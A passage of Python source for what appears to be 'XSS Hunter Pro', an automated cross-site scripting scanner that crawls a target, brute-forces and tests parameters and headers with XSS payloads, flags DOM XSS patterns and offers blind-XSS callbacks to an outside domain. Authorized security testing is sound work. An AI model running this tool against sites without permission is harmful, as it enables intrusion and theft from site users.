            # Fetch external JS files — ONLY from target domain / subdomains
            for script in soup.find_all("script", src=True):
                src = script.get("src")
                if src:
                    js_url = urljoin(url, src)
                    # Skip third-party JS (CDNs, analytics, etc.)
                    if target_domain and not _is_in_scope(js_url, target_domain):
                        continue
                    try:
                        js_resp = self.session.get(js_url, timeout=self.config.request_timeout)
                        js_blocks.append((js_url, js_resp.text))
                    except Exception:
                        pass

            # Analyze each JS block for source->sink patterns with proximity check
            seen_pairs: Set[Tuple[str, str, str]] = set()
            for js_label, js_content in js_blocks:
                for sink_pattern in dangerous_sinks:
                    for sink_match in re.finditer(sink_pattern, js_content, re.IGNORECASE):
                        sink_pos = sink_match.start()
                        for source_pattern in dangerous_sources:
                            for source_match in re.finditer(source_pattern, js_content, re.IGNORECASE):
                                source_pos = source_match.start()

                                # Require source and sink to be within proximity window
                                if abs(sink_pos - source_pos) > PROXIMITY_WINDOW:
                                    continue

                                dedup = (js_label, sink_pattern, source_pattern)
                                if dedup in seen_pairs:
                                    continue
                                seen_pairs.add(dedup)

                                param_name = "DOM_XSS" if js_label == "inline" else "DOM_XSS_EXTERNAL"
                                report_url = url if js_label == "inline" else js_label

                                # Higher confidence when source feeds directly into sink
                                conf = 50 if js_label == "inline" else 35
                                # Boost if source appears BEFORE sink (data flows forward)
                                if source_pos < sink_pos:
                                    conf += 10

                                results.append(XSSResult(
                                    url=report_url,
                                    parameter=param_name,
                                    payload="Potential DOM XSS detected",
                                    payload_type=XSSPayloadType.DOM,
                                    context="javascript",
                                    evidence=f"Sink: {sink_match.group()}, Source: {source_match.group()}",
                                    confidence=conf,
                                    requires_browser=True
                                ))

        except Exception as e:
            logger.debug(f"DOM XSS scan error: {e}")

        return results

# ============== Browser-Based Verification ==============

class BrowserVerifier:
    """Browser-based XSS verification using Chrome"""

    def __init__(self, config: Config):
        self.config = config
        self.chrome_path = config.chrome_path

    def is_chrome_available(self) -> bool:
        """Check if Chrome is available"""
        return os.path.exists(self.chrome_path)

    def verify_xss(self, url: str, param: str, payload: str) -> bool:
        """
        Verify XSS using headless Chrome
        Returns True if XSS was triggered
        """
        if not self.is_chrome_available():
            logger.warning("Chrome not available for browser verification")
            return False

        # Build test URL and HTML-escape it to prevent injection into our own template
        test_url = html.escape(f"{url}?{param}={quote(payload)}", quote=True)

        # Create a simple HTML file to load the test URL
        html_template = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>XSS Test</title>
        </head>
        <body>
            <iframe src="{test_url}" id="testFrame"></iframe>
            <script>
                // Monitor for XSS triggers
                let xssTriggered = false;

                window.addEventListener('message', (event) => {{
                    if (event.data === 'XSS_TRIGGERED') {{
                        xssTriggered = true;
                    }}
                }});

                // Check iframe content
                setTimeout(() => {{
                    try {{
                        let iframe = document.getElementById('testFrame');
                        let content = iframe.contentWindow.document.body.innerHTML;
                        if (content.includes('XSSHUNTERPROTEST')) {{
                            console.log('XSS_REFLECTED');
                        }}
                    }} catch(e) {{
                        console.log('CROSS_ORIGIN');
                    }}
                }}, 3000);
            </script>
        </body>
        </html>
        """

        # Use secure temp file creation to prevent race conditions and symlink attacks
        fd, temp_html = tempfile.mkstemp(suffix=".html", prefix="xss_test_")
        try:
            with os.fdopen(fd, "w") as f:
                f.write(html_template)

            # Run Chrome in headless mode
            cmd = [
                self.chrome_path,
                "--headless",
                "--no-sandbox",
                "--disable-gpu",
                "--disable-dev-shm-usage",
                "--timeout=10000",
                "--dump-dom",
                f"file://{temp_html}"
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=15
            )

            # Check output for XSS evidence
            if "XSSHUNTERPROTEST" in result.stdout:
                return True

            return False

        except subprocess.TimeoutExpired:
            return False
        except Exception as e:
            logger.debug(f"Browser verification error: {e}")
            return False
        finally:
            # Cleanup
            if os.path.exists(temp_html):
                os.remove(temp_html)

# ============== Main Scanner ==============

class XSSHunterPro:
    """Main XSS Scanner orchestrator"""

    def __init__(self, config: Config):
        self.config = config
        self.session = create_http_session(config)
        self.katana = KatanaCrawler(config)
        self.scanner = XSSScanner(config, self.session)
        self.browser = BrowserVerifier(config)
        self.results: List[XSSResult] = []
        self.parameters: Set[ParameterInfo] = set()

    def scan(self, target: str, headless: bool = False) -> List[XSSResult]:
        """
        Main scan function
        """
        print_banner()

        logger.info(colored(f"[*] Starting XSS Hunter Pro scan for: {target}", "cyan"))
        start_time = time.time()

        # Phase 1: Crawling
        logger.info(colored("\n[Phase 1] Crawling target with Katana...", "yellow"))
        urls, params = self.katana.crawl(target, headless=headless)
        self.parameters.update(params)

        logger.info(colored(f"[+] Found {len(urls)} URLs", "green"))
        logger.info(colored(f"[+] Found {len(params)} parameters from crawling", "green"))

        # Filter crawled URLs to in-scope only (target domain + subdomains)
        target_domain = self.katana.target_domain
        if target_domain:
            before = len(urls)
            urls = {u for u in urls if _is_in_scope(u, target_domain)}
            filtered = before - len(urls)
            if filtered > 0:
                logger.info(colored(f"[*] Filtered {filtered} out-of-scope URLs", "yellow"))
                self.katana.crawled_urls = urls

        # Phase 2: Parameter Discovery Enhancement
        logger.info(colored("\n[Phase 2] Enhancing parameter discovery...", "yellow"))
        additional_params = self._discover_additional_params(urls)
        self.parameters.update(additional_params)

        # Phase 2b: Brute-force common parameter names
        if self.config.brute_params:
            logger.info(colored("[Phase 2b] Brute-forcing common parameter names...", "yellow"))
            brute_params = self._brute_force_params(urls)
            self.parameters.update(brute_params)

        logger.info(colored(f"[+] Total parameters to test: {len(self.parameters)}", "green"))

        # Phase 3: Reflection Testing (GET + POST)
        logger.info(colored("\n[Phase 3] Testing for reflected parameters...", "yellow"))
        reflected_params = self._find_reflected_parameters()

        logger.info(colored(f"[+] Found {len(reflected_params)} reflected parameters", "green"))

        # Phase 3b: Header injection testing
        if self.config.test_headers:
            logger.info(colored("[Phase 3b] Testing header reflections...", "yellow"))
            header_results = self._test_header_reflections(urls)
            self.results.extend(header_results)

        # Phase 4: XSS Payload Testing
        logger.info(colored("\n[Phase 4] Testing XSS payloads...", "yellow"))
        self.results.extend(self._test_xss_payloads(reflected_params))

        # Phase 5: DOM XSS Scanning
        if self.config.scan_dom:
            logger.info(colored("\n[Phase 5] Scanning for DOM XSS...", "yellow"))
            dom_results = self._scan_dom_xss(urls)
            self.results.extend(dom_results)
        else:
            logger.info(colored("\n[Phase 5] DOM XSS scanning skipped (--nodom)", "yellow"))

        # Phase 6: Browser Verification (if available)
        if self.browser.is_chrome_available():
            logger.info(colored("\n[Phase 6] Browser-based verification...", "yellow"))
            self._verify_results_with_browser()

        # Deduplicate results
        self.results = self._deduplicate_results(self.results)

        # Generate Report
        elapsed_time = time.time() - start_time
        self._generate_report(target, elapsed_time)

        return self.results

    def _discover_additional_params(self, urls: Set[str]) -> Set[ParameterInfo]:
        """Discover additional parameters from URLs.

        Uses URL-pattern normalisation to collapse URL variations (e.g.
        ``/course/123?q`` and ``/course/456?q``) into a single entry so
        we don't create duplicate parameter records for the same endpoint.
        """
        additional: Set[ParameterInfo] = set()

        # Extract parameters from all URLs, deduplicating by normalized pattern
        param_pattern_seen: Set[Tuple[str, str]] = set()  # (pattern, param)
        for url in urls:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            for param in query_params:
                pattern_key = (_normalize_url_pattern(base), param)
                if pattern_key not in param_pattern_seen:
                    param_pattern_seen.add(pattern_key)
                    additional.add(ParameterInfo(
                        url=base,
                        parameter=param,
                        source="url"
                    ))

        # Scan for hidden parameters in forms — use one URL per normalized pattern
        seen_form_patterns: Set[str] = set()
        urls_to_scan: List[str] = []
        for url in urls:
            pattern = _normalize_url_pattern(url)
            if pattern not in seen_form_patterns:
                seen_form_patterns.add(pattern)
                urls_to_scan.append(url)
                if len(urls_to_scan) >= 100:
                    break
        for url in urls_to_scan:
            try:
                response = self.session.get(url, timeout=self.config.request_timeout)
                soup = BeautifulSoup(response.text, "html.parser")

                # Find all forms
                for form in soup.find_all("form"):
                    action = form.get("action", "")
                    form_url = urljoin(url, action) if action else url
                    method = form.get("method", "GET").upper()

                    # Collect all inputs for this form
                    post_data: Dict[str, str] = {}
                    for inp in form.find_all(["input", "textarea", "select"]):
                        name = inp.get("name")
                        if name:
                            value = inp.get("value", "")
                            post_data[name] = value

                    for name in post_data:
                        additional.add(ParameterInfo(
                            url=form_url,
                            parameter=name,
                            method=method,
                            post_data=post_data,
                            source="form"
                        ))

                # Find parameters in JavaScript
                scripts = soup.find_all("script")
                for script in scripts:
                    if script.string:
                        url_pattern = r"['\"]((?:[^'\"]*(?:\?|&)[^'\"]*=[^'\"]*))['\"]"
                        matches = re.findall(url_pattern, script.string)
                        for match in matches:
                            parsed = urlparse(urljoin(url, match))
                            for param in parse_qs(parsed.query):
                                additional.add(ParameterInfo(
                                    url=f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                                    parameter=param,
                                    source="js"
                                ))

            except Exception as e:
                logger.debug(f"Error discovering params from {url}: {e}")

        return additional

    def _brute_force_params(self, urls: Set[str]) -> Set[ParameterInfo]:
        """Try common parameter names against a sample of URLs to find hidden params.

        Uses URL-pattern normalisation to avoid testing the same endpoint
        pattern multiple times (e.g. ``/course/123`` and ``/course/456``).
        """
        discovered: Set[ParameterInfo] = set()

        # Pick a small sample of unique *normalized* base URLs so we don't
        # brute-force the same endpoint template with different IDs.
        seen_patterns: Set[str] = set()
        base_urls: List[str] = []
        for url in urls:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            pattern = _normalize_url_pattern(base)
            if pattern not in seen_patterns:
                seen_patterns.add(pattern)
                base_urls.append(base)
                if len(base_urls) >= 10:
                    break

        for base_url in base_urls:
            for param in COMMON_PARAMS:
                try:
                    response = self.session.get(
                        base_url,
                        params={param: self.config.reflection_marker},
                        timeout=self.config.request_timeout,
                    )
                    if self.config.delay_between_requests > 0:
                        time.sleep(self.config.delay_between_requests)
                    if self.config.reflection_marker in response.text:
                        discovered.add(ParameterInfo(
                            url=base_url,
                            parameter=param,
                            source="brute"
                        ))
                        if self.config.verbose:
                            logger.info(colored(f"  [BRUTE] Found reflecting param: {base_url}?{param}", "yellow"))
                except Exception:
                    pass

        logger.info(colored(f"[+] Brute-force discovered {len(discovered)} reflecting parameters", "green"))
        return discovered

    def _find_reflected_parameters(self) -> List[ParameterInfo]:
        """Find parameters that reflect their input (GET and POST).

        Uses URL-pattern normalisation so that ``/item/123?q`` and
        ``/item/456?q`` are treated as the same endpoint and only tested
        once.  This dramatically reduces scan time on sites with many
        content pages that share the same template.
        """
        reflected: List[ParameterInfo] = []
        seen_keys: Set[Tuple[str, str, str]] = set()  # (url, param, method) dedup

        # --- Deduplicate parameters by normalized URL pattern ---
        # Keep only one representative ParameterInfo per (pattern, param, method)
        pattern_seen: Set[Tuple[str, str, str]] = set()
        deduped_params: List[ParameterInfo] = []
        for p in self.parameters:
            pattern_key = (_normalize_url_pattern(p.url), p.parameter, p.method)
            if pattern_key not in pattern_seen:
                pattern_seen.add(pattern_key)
                deduped_params.append(p)

        before_count = len(self.parameters)
        after_count = len(deduped_params)
        if before_count > after_count:
            logger.info(colored(
                f"[*] Deduplicated parameters: {before_count} -> {after_count} "
                f"(removed {before_count - after_count} duplicate endpoint patterns)",
                "yellow"
            ))

        # --- GET parameters ---
        get_params = [p for p in deduped_params if p.method == "GET"]
        if get_params:
            with ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
                futures = {
                    executor.submit(
                        self.scanner.exparam.check_reflection,
                        p.url,
                        p.parameter
                    ): p for p in get_params
                }

                for future in as_completed(futures):
                    param_info = futures[future]
                    try:
                        result = future.result()
                        if result:
                            key = (param_info.url, param_info.parameter, param_info.method)
                            if key not in seen_keys:
                                seen_keys.add(key)
                                reflected.append(param_info)
                                logger.info(colored(f"  [REFLECTED] GET {param_info.url}?{param_info.parameter}", "green"))
                    except Exception as e:
                        logger.debug(f"Error: {e}")

        # --- POST parameters ---
        post_params = [p for p in deduped_params if p.method == "POST"]
        if post_params:
            with ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
                futures = {
                    executor.submit(
                        self.scanner.exparam.check_post_reflection,
                        p.url,
                        p.parameter,
                        p.post_data,
                    ): p for p in post_params
                }

                for future in as_completed(futures):
                    param_info = futures[future]
                    try:
                        result = future.result()
                        if result:
                            key = (param_info.url, param_info.parameter, param_info.method)
                            if key not in seen_keys:
                                seen_keys.add(key)
                                reflected.append(param_info)
                                logger.info(colored(f"  [REFLECTED] POST {param_info.url} -> {param_info.parameter}", "green"))
                    except Exception as e:
                        logger.debug(f"Error: {e}")

        return reflected

    def _test_header_reflections(self, urls: Set[str]) -> List[XSSResult]:
        """Test common injectable headers for reflection + XSS on a sample of URLs."""
        results: List[XSSResult] = []
        sample_urls = list(urls)[:20]

        for url in sample_urls:
            for header in INJECTABLE_HEADERS:
                reflection = self.scanner.exparam.check_header_reflection(url, header)
                if reflection:
                    logger.info(colored(f"  [HEADER REFLECTED] {header} at {url}", "yellow"))
                    # Test a small set of payloads in the header
                    for payload_obj in [p for p in XSS_PAYLOADS if p.priority == 1 and p.context in ("html", "attribute")][:5]:
                        resolved = self.scanner._resolve_payload(payload_obj)
                        try:
                            resp = self.session.get(
                                url,
                                headers={header: resolved},
                                timeout=self.config.request_timeout,
                            )
                            decoded = unquote(resp.text)
                            if resolved in decoded:
                                results.append(XSSResult(
                                    url=url,
                                    parameter=f"Header:{header}",
                                    payload=resolved,
                                    payload_type=XSSPayloadType.REFLECTED,
                                    context="header",
                                    evidence=f"Payload reflected via {header} header",
                                    confidence=70,
                                ))
                                break  # one confirmed payload per header per URL is enough
                        except Exception:
                            pass

        return results

    def _test_xss_payloads(self, params: List[ParameterInfo]) -> List[XSSResult]:
        """Test ALL XSS payloads on reflected parameters (context-aware)."""
        results: List[XSSResult] = []

        total = len(params) * sum(1 for p in XSS_PAYLOADS if not (p.payload_type == XSSPayloadType.BLIND and not self.config.blind_xss_callback))
        processed = 0

        with ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
            futures = []

            for param_info in params:
                for payload_obj in XSS_PAYLOADS:
                    # Skip blind payloads if no callback configured
                    if payload_obj.payload_type == XSSPayloadType.BLIND and not self.config.blind_xss_callback:
                        continue
                    futures.append(
                        executor.submit(self.scanner._test_xss_payload, param_info, payload_obj)
                    )

            for future in as_completed(futures):
                processed += 1
                if processed % 200 == 0:
                    logger.info(f"  Progress: {processed}/{total}")

                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        logger.info(colored(f"  [XSS] {result.url}?{result.parameter} | {result.payload_type.value} | conf={result.confidence}%", "green"))
                except Exception as e:
                    logger.debug(f"Error: {e}")

        return results

    def _scan_dom_xss(self, urls: Set[str]) -> List[XSSResult]:
        """Scan for DOM XSS in URLs"""
        results: List[XSSResult] = []
        target_domain = self.katana.target_domain

        sample = list(urls)[:min(50, len(urls))]
        for url in sample:
            try:
                dom_results = self.scanner.scan_dom_xss(url, target_domain=target_domain)
                results.extend(dom_results)
            except Exception as e:
                logger.debug(f"DOM XSS scan error: {e}")

        return results

    def _verify_results_with_browser(self):
        """Verify XSS results using browser"""
        for result in self.results:
            if result.requires_browser and result.confidence < 80:
                verified = self.browser.verify_xss(
                    result.url,
                    result.parameter,
                    result.payload
                )
                if verified:
                    result.confidence = 100
                    logger.info(colored(f"  [VERIFIED] {result.url}?{result.parameter}", "green"))

    @staticmethod
    def _deduplicate_results(results: List[XSSResult]) -> List[XSSResult]:
        """Deduplicate results, keeping the highest confidence for each (url, param, type)."""
        best: Dict[Tuple[str, str, str], XSSResult] = {}
        for r in results:
            key = r.dedup_key
            if key not in best or r.confidence > best[key].confidence:
                best[key] = r
        return sorted(best.values(), key=lambda r: r.confidence, reverse=True)

    def _generate_report(self, target: str, elapsed_time: float):
        """Generate final report"""
        os.makedirs(self.config.output_dir, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        total_urls = len(self.katana.crawled_urls)

        # Save JSON report
        json_file = os.path.join(self.config.output_dir, f"xss_report_{timestamp}.json")
        with open(json_file, "w") as f:
            json.dump({
                "target": target,
                "scan_time": elapsed_time,
                "total_urls": total_urls,
                "total_parameters": len(self.parameters),
                "vulnerabilities": [r.to_dict() for r in self.results],
                "summary": {
                    "total_xss": len(self.results),
                    "high_confidence": len([r for r in self.results if r.confidence >= 80]),
                    "reflected": len([r for r in self.results if r.payload_type == XSSPayloadType.REFLECTED]),
                    "dom": len([r for r in self.results if r.payload_type == XSSPayloadType.DOM]),
                    "blind": len([r for r in self.results if r.payload_type == XSSPayloadType.BLIND]),
                }
            }, f, indent=2)

        # Save text report
        txt_file = os.path.join(self.config.output_dir, f"xss_report_{timestamp}.txt")
        with open(txt_file, "w") as f:
            f.write("=" * 80 + "\n")
            f.write("XSS HUNTER PRO - VULNERABILITY REPORT\n")
            f.write("=" * 80 + "\n\n")

            f.write(f"Target: {target}\n")
            f.write(f"Scan Duration: {elapsed_time:.2f} seconds\n")
            f.write(f"Total URLs Crawled: {total_urls}\n")
            f.write(f"Total Parameters Found: {len(self.parameters)}\n")
            f.write(f"Total XSS Found: {len(self.results)}\n\n")

            f.write("-" * 80 + "\n")
            f.write("VULNERABILITIES:\n")
            f.write("-" * 80 + "\n\n")

            for i, result in enumerate(self.results, 1):
                f.write(f"[{i}] {result.payload_type.value.upper()} XSS\n")
                f.write(f"    URL: {result.url}\n")
                f.write(f"    Parameter: {result.parameter}\n")
                f.write(f"    Payload: {result.payload}\n")
                f.write(f"    Context: {result.context}\n")
                f.write(f"    Confidence: {result.confidence}%\n")
                f.write(f"    WAF Bypass: {'Yes' if result.waf_bypass else 'No'}\n")
                f.write(f"    Evidence: {result.evidence}\n\n")

        # Print summary
        print_summary(self.results, elapsed_time, target, total_urls)

        logger.info(colored(f"\n[+] Report saved to: {json_file}", "green"))
        logger.info(colored(f"[+] Text report saved to: {txt_file}", "green"))

# ============== Utility Functions ==============

def print_banner():
    """Print tool banner"""
    banner_art = r"""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║   ██╗  ██╗███████╗███████╗  ██╗  ██╗██╗   ██╗███╗   ██╗     ║
    ║   ╚██╗██╔╝██╔════╝██╔════╝  ██║  ██║██║   ██║████╗  ██║     ║
    ║    ╚███╔╝ ███████╗███████╗  ███████║██║   ██║██╔██╗ ██║     ║
    ║    ██╔██╗ ╚════██║╚════██║  ██╔══██║██║   ██║██║╚██╗██║     ║
    ║   ██╔╝ ██╗███████║███████║  ██║  ██║╚██████╔╝██║ ╚████║     ║
    ║   ╚═╝  ╚═╝╚══════╝╚══════╝  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝     ║
    ║                                                               ║
    ║            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                 ║
    ║            |A|u|t|o|m|a|t|e|d| |X|S|S| |P|r|o|               ║
    ║            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                 ║
    ║                     v 3 . 1 . 0                               ║
    ║                                                               ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║                                                               ║
    ║   Automated XSS Vulnerability Scanner                         ║
    ║   Crawl + Discover + Reflect + Exploit + Verify               ║
    ║                                                               ║
    ║   Coded by : RootDR                                           ║
    ║   Twitter  : x.com/R00tDR                                     ║
    ║   Telegram : t.me/RootDR                                      ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """
    print(colored(banner_art, "cyan"))

def print_summary(results: List[XSSResult], elapsed_time: float, target: str, total_urls: int = 0):
    """Print scan summary"""
    print("\n")
    print(colored("=" * 80, "cyan"))
    print(colored("SCAN SUMMARY", "cyan"))
    print(colored("=" * 80, "cyan"))
    print(f"\n  Target: {target}")
    print(f"  Duration: {elapsed_time:.2f} seconds")
    print(f"  URLs Crawled: {total_urls}")
    print(f"\n  Total XSS Found: {colored(str(len(results)), 'green' if results else 'red')}")

    if results:
        # Count by type
        reflected = len([r for r in results if r.payload_type == XSSPayloadType.REFLECTED])
        dom = len([r for r in results if r.payload_type == XSSPayloadType.DOM])
        blind = len([r for r in results if r.payload_type == XSSPayloadType.BLIND])
        mutation = len([r for r in results if r.payload_type == XSSPayloadType.MUTATION])

        print(f"\n  By Type:")
        print(f"    - Reflected XSS: {reflected}")
        print(f"    - DOM XSS: {dom}")
        print(f"    - Blind XSS: {blind}")
        print(f"    - Mutation XSS: {mutation}")

        # Count by confidence
        high = len([r for r in results if r.confidence >= 80])
        medium = len([r for r in results if 50 <= r.confidence < 80])
        low = len([r for r in results if r.confidence < 50])

        print(f"\n  By Confidence:")
        print(f"    - High (80%+): {colored(str(high), 'green')}")
        print(f"    - Medium (50-79%): {colored(str(medium), 'yellow')}")
        print(f"    - Low (<50%): {colored(str(low), 'red')}")

        print(f"\n  Top Vulnerabilities:")
        for result in sorted(results, key=lambda x: x.confidence, reverse=True)[:5]:
            print(colored(f"    [{result.confidence}%] {result.url}?{result.parameter} ({result.payload_type.value})", "green"))

    print("\n" + "=" * 80 + "\n")

def _validate_target_url(target: str) -> str:
    """Validate and sanitize the target URL.

    Ensures the URL uses http/https scheme and warns about private/reserved IPs.
    """
    parsed = urlparse(target)

    # Enforce http or https scheme
    if parsed.scheme not in ("http", "https"):
        logger.error(f"Invalid URL scheme '{parsed.scheme}'. Only http and https are allowed.")
        sys.exit(1)

    # Warn about private/reserved IP ranges (potential SSRF)
    hostname = parsed.hostname
    if hostname:
        try:
            addr = ipaddress.ip_address(hostname)
            if addr.is_private or addr.is_reserved or addr.is_loopback or addr.is_link_local:
                logger.warning(
                    f"Target hostname '{hostname}' resolves to a private/reserved IP address. "
                    "Scanning internal networks may be unintended. Proceeding anyway."
                )
        except ValueError:
            # hostname is not an IP literal (it is a domain name), which is fine
            pass

    return target


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="XSS Hunter Pro - Advanced Automated XSS Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t https://example.com
  %(prog)s -t https://example.com --headless
  %(prog)s -t https://example.com -d 5 --threads 50
  %(prog)s -t https://example.com --blind-callback xss.ht
        """
    )

    parser.add_argument("-t", "--target", required=True, help="Target URL to scan")
    parser.add_argument("-d", "--depth", type=int, default=4, help="Crawl depth (default: 4)")
    parser.add_argument("--threads", type=int, default=50, help="Number of threads (default: 50)")
    parser.add_argument("--headless", action="store_true", help="Enable headless browser crawling")
    parser.add_argument("--chrome-path", default="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", help="Path to Chrome executable")
    parser.add_argument("--output", default="xss_results", help="Output directory")
    parser.add_argument("--blind-callback", help="Blind XSS callback domain (e.g., xss.ht)")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between requests in seconds")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds")
    parser.add_argument("--max-urls", type=int, default=10000, help="Maximum URLs to crawl")
    parser.add_argument("--no-headers", action="store_true", help="Skip header injection testing")
    parser.add_argument("--no-brute", action="store_true", help="Skip common parameter brute-forcing")
    parser.add_argument("--nodom", action="store_true", help="Skip DOM XSS scanning (faster scans)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output (DEBUG logging)")

    args = parser.parse_args()

    # Validate target URL
    validated_target = _validate_target_url(args.target)

    # Verbose mode switches logger to DEBUG
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Create config
    config = Config(
        chrome_path=args.chrome_path,
        max_threads=args.threads,
        crawl_depth=args.depth,
        output_dir=args.output,
        delay_between_requests=args.delay,
        request_timeout=args.timeout,
        verbose=args.verbose,
        max_urls=args.max_urls,
        test_headers=not args.no_headers,
        brute_params=not args.no_brute,
        scan_dom=not args.nodom,
    )

    if args.blind_callback:
        config.blind_xss_callback = args.blind_callback

    # Initialize scanner
    scanner = XSSHunterPro(config)

    # Run scan
    try:
        results = scanner.scan(validated_target, headless=args.headless)
        sys.exit(0 if results else 1)
    except KeyboardInterrupt:
        print(colored("\n[!] Scan interrupted by user", "red"))
        sys.exit(130)
    except Exception as e:
        logger.error(f"Scan error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
